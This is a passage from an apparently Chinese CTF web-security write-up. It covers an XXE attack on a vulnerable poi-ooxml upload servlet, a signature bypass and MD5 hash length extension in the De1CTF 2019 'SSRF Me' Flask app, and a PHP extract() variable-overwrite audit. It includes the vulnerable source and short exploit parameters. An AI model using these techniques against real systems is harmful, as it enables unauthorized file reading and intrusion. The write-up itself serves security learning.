fileItem.getString(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>         <span class="hljs-keyword">continue</span>;<br>       &#125; <br>       String filename = fileItem.getName();<br>       <span class="hljs-keyword">if</span> (filename == <span class="hljs-keyword">null</span> || filename.trim().equals(<span class="hljs-string">&quot;&quot;</span>))<br>         <span class="hljs-keyword">continue</span>; <br>       String fileExtName = filename.substring(filename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>       InputStream in = fileItem.getInputStream();<br>       <span class="hljs-comment">//注意看这里***************************************************</span><br>       <span class="hljs-keyword">if</span> (filename.startsWith(<span class="hljs-string">&quot;excel-&quot;</span>) &amp;&amp; <span class="hljs-string">&quot;xlsx&quot;</span>.equals(fileExtName))<br>         <span class="hljs-keyword">try</span> &#123;<br>           Workbook wb1 = WorkbookFactory.create(in);<br>           Sheet sheet = wb1.getSheetAt(<span class="hljs-number">0</span>);<br>           System.out.println(sheet.getFirstRowNum());<br>         &#125; <span class="hljs-keyword">catch</span> (InvalidFormatException e) &#123;<br>           System.err.println(<span class="hljs-string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);<br>           e.printStackTrace();<br>         &#125;  <br>       String saveFilename = makeFileName(filename);<br>       request.setAttribute(<span class="hljs-string">&quot;saveFilename&quot;</span>, saveFilename);<br>       request.setAttribute(<span class="hljs-string">&quot;filename&quot;</span>, filename);<br>       String realSavePath = makePath(saveFilename, savePath);<br>       FileOutputStream out = <span class="hljs-keyword">new</span> FileOutputStream(realSavePath + <span class="hljs-string">&quot;/&quot;</span> + saveFilename);<br>       <span class="hljs-keyword">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>       <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">while</span> ((len = in.read(buffer)) &gt; <span class="hljs-number">0</span>)<br>         out.write(buffer, <span class="hljs-number">0</span>, len); <br>       in.close();<br>       out.close();<br>       message = <span class="hljs-string">&quot;;</span><br><span class="hljs-string">     &#125; </span><br><span class="hljs-string">   &#125; catch (FileUploadException e) &#123;</span><br><span class="hljs-string">     e.printStackTrace();</span><br><span class="hljs-string">   &#125; </span><br><span class="hljs-string">   request.setAttribute(&quot;</span>message<span class="hljs-string">&quot;, message);</span><br><span class="hljs-string">   request.getRequestDispatcher(&quot;</span>/ListFileServlet<span class="hljs-string">&quot;).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="hljs-string"> &#125;</span><br></code></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1668912">CVE-2014-3529</a></p>
<p>接下来就是制作存在XXE的xlsx文件，直接读取<code>/flag</code>（之前在任意读取时，测试发现这个文件被ban掉了）</p>
<p>制作的时候需要注意，xlsx改后缀为zip文件后，直接用winrar打开后在内部修改，解压后再压缩可能出现问题。</p>
<p>最后打出flag。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816152852215.png" srcset="/img/loading.gif" lazyload alt="image-20220816152852215" /></p>
<h2 id="代码审计">6、代码审计</h2>
<h3 id="de1ctf-2019ssrf-me代码审计哈希扩展攻击">1、[De1ctf 2019]SSRF Me（代码审计/哈希扩展攻击）</h3>
<p>首先看源代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><span class="hljs-comment"># import importlib</span><br><br><br><span class="hljs-comment"># importlib.</span><br><span class="hljs-comment"># reload(sys)</span><br><span class="hljs-comment"># sys.setdefaultencoding(&#x27;latin1&#x27;)</span><br><br>app = Flask(__name__)<br><br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):          <span class="hljs-comment">#SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span>(<span class="hljs-params">self</span>):</span><br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()): 							<span class="hljs-comment"># 校验hash</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:		<span class="hljs-comment"># 读取url内容，存储到文件中</span><br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:		<span class="hljs-comment"># 读取文件内容</span><br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span>(<span class="hljs-params">self</span>):</span>		<span class="hljs-comment"># 校验签名</span><br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 生成签名</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span>():</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><span class="hljs-comment"># 实现SSRF的关键点</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span>():</span><br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span>(waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello world!&quot;</span><br><br><span class="hljs-comment"># 访问对应param的内容</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span>(<span class="hljs-params">param</span>):</span><br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-comment"># 计算签名</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span>(<span class="hljs-params">action, param</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">content</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params">param</span>):</span><br>    check=param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,port=<span class="hljs-number">7781</span>)<br></code></pre></td></tr></table></figure>
<p>首先阅读源代码之后，我们能够梳理出大致逻辑</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs fortran">geneSign -&gt; 生成签名（param自选，<span class="hljs-keyword">action</span>=<span class="hljs-built_in">scan</span>）<br>校验签名 -&gt; 将上传的签名和计算的签名（param自选，<span class="hljs-keyword">action</span>自选）<br><span class="hljs-built_in">scan</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">action</span> -&gt; 访问并读取到文件中<br>read <span class="hljs-keyword">in</span> <span class="hljs-keyword">action</span> -&gt; 读取文件<br></code></pre></td></tr></table></figure>
<h4 id="解法一字符串拼接">解法一、字符串拼接</h4>
<p>审计下来，发现代码中比较可疑的点在于scan 和 read 的判断是<code>in action</code>，并且两者是独立的分支结构。</p>
<p>同时签名验证的核心其实是</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">key + para<span class="hljs-name">m0</span> + <span class="hljs-string">&#x27;scan&#x27;</span> = key + para<span class="hljs-name">m1</span> + actio<span class="hljs-symbol">n1</span><br></code></pre></td></tr></table></figure>
<p>那么，我们可以构造</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">param0</span> = flag.txtread<br><br><span class="hljs-attr">param1</span> = flag.txt<br><span class="hljs-attr">action1</span> = readscan<br></code></pre></td></tr></table></figure>
<p>这样我们就成功地实现了read的功能，最后得到flag。</p>
<h4 id="解法二哈希扩展攻击">解法二、哈希扩展攻击</h4>
<p>推荐阅读博客：</p>
<p><a target="_blank" rel="noopener" href="https://joychou.org/web/hash-length-extension-attack.html">md5 hash attack</a></p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018005050116.png" srcset="/img/loading.gif" lazyload alt="image-20221018005050116" style="zoom: 67%;" /></p>
<p>如果有了这样的攻击手段，那我们就可以在不知道secret_key的情况下，把read加入我们的sign中，也能实现攻击。</p>
<p>需要注意的是此处必须是salt + message，如果顺序颠倒，则无法实现md5hash扩展攻击。</p>
<p>利用现成的脚本:</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">28 </span>= <span class="hljs-keyword">len</span>(secret_key) + <span class="hljs-keyword">len</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>) + <span class="hljs-keyword">len</span>(<span class="hljs-string">&quot;read&quot;</span>)<br></code></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011057035.png" srcset="/img/loading.gif" lazyload alt="image-20221018011057035" /></p>
<p>将生成的结果注入，注意要在action前面加上scan</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">param</span>=flag.txt<br></code></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011220758.png" srcset="/img/loading.gif" lazyload alt="image-20221018011220758" /></p>
<h3 id="gfctf-baby_web变量覆盖">2、GFCTF-Baby_Web（变量覆盖）</h3>
<p>这道题主要考察PHP源码审计的能力，当然要想做出来这道题，还是需要一些额外的技巧。</p>
<p><code>F12</code>发现源代码，暗示存在路径穿越。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome To GFCTF 12th!!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-comment">&lt;!--源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?--&gt;</span><br></code></pre></td></tr></table></figure>
<p>这也没有可以注入的参数，于是先dirsearch扫一下，直接扫出来了</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/blog0013-0001.png" srcset="/img/loading.gif" lazyload alt="blog0013_0001" style="zoom:80%;" /></p>
<p>直接上BP</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/blog0013_0002.png" srcset="/img/loading.gif" lazyload alt="blog0013_0002" style="zoom: 50%;" /></p>
<p>于是把源代码扒下来，接下来就是变量覆盖的事了。</p>
<p>先看文件包含这一块：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>defined(<span class="hljs-string">&#x27;main&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Temp</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$date</span>=[<span class="hljs-string">&#x27;version&#x27;</span>=&gt;<span class="hljs-string">&#x27;1.0&#x27;</span>,<span class="hljs-string">&#x27;img&#x27;</span>=&gt;<span class="hljs-string">&#x27;https://www.apache.org/img/asf-estd-1999-logo.jpg&#x27;</span>];<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$template</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;date = array_merge(<span class="hljs-keyword">$this</span>-&gt;date,<span class="hljs-variable">$data</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTempName</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$dir</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span> === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;template = str_replace(<span class="hljs-string">&#x27;..&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;./template/admin/&#x27;</span>.<span class="hljs-variable">$template</span>);<br>            <span class="hljs-keyword">if</span>(!is_file(<span class="hljs-keyword">$this</span>-&gt;template))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;template = <span class="hljs-string">&#x27;./template/index.html&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">display</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>        extract(<span class="hljs-keyword">$this</span>-&gt;date);	<span class="hljs-comment">//文件包含入口</span><br>        <span class="hljs-keyword">$this</span>-&gt;getTempName(<span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>);<br>        <span class="hljs-keyword">include</span>(<span class="hljs-keyword">$this</span>-&gt;template);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>简单理解就是，我们需要有<code>$space</code>变量，才能完成文件包含，于是我们直接POST上去，由于<code>extract</code>的作用，实现了变量覆盖，使得文件<code>/templace/admin/index.html</code>能够被包含。</p>
<p>于是走到最后一步：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;listdata(<span class="hljs-string">&quot;action=list module=<span class="hljs-subst">$mod</span>&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>对应的后端源代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listdata</span>(<span class="hljs-params"><span class="hljs-variable">$_params</span></span>)</span>&#123;<br>       <span class="hljs-variable">$system</span> = [<br>           <span class="hljs-string">&#x27;db&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;app&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;num&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;sum&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;form&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;page&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;site&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;not_flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;show_flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;more&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;catid&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;field&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;order&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;space&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;table&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;table_site&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;total&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;join&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;on&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;action&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;return&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;sbpage&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;urlrule&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;pagesize&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;pagefile&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>       ];<br><br>       <span class="hljs-variable">$param</span> = <span class="hljs-variable">$where</span> = [];<br><br>       <span class="hljs-variable">$_params</span> = trim(<span class="hljs-variable">$_params</span>);	<span class="hljs-comment">//去除头尾的空白符</span><br><br>       <span class="hljs-variable">$params</span> = explode(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-variable">$_params</span>);<br>       <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>], [<span class="hljs-string">&#x27;list&#x27;</span>,<span class="hljs-string">&#x27;function&#x27;</span>])) &#123;<br>           <span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;action=&#x27;</span>.<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>];<br>       &#125;<br>       <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$t</span>) &#123;<br>           <span class="hljs-variable">$var</span> = substr(<span class="hljs-variable">$t</span>, <span class="hljs-number">0</span>, strpos(<span class="hljs-variable">$t</span>, <span class="hljs-string">&#x27;=&#x27;</span>));<br>           <span class="hljs-variable">$val</span> = substr(<span class="hljs-variable">$t</span>, strpos(<span class="hljs-variable">$t</span>, <span class="hljs-string">&#x27;=&#x27;</span>) + <span class="hljs-number">1</span>);<br>           <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$var</span>) &#123;<br>               <span class="hljs-keyword">continue</span>;<br>           &#125;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>])) &#123; <br>               <span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>;   <span class="hljs-comment">//实现系统变量覆盖，覆盖action</span><br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-variable">$param</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>;    <span class="hljs-comment">//存放自己设置的变量</span><br>           &#125;<br>       &#125;<br>       <span class="hljs-comment">// action</span><br>       <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &#123;<br> 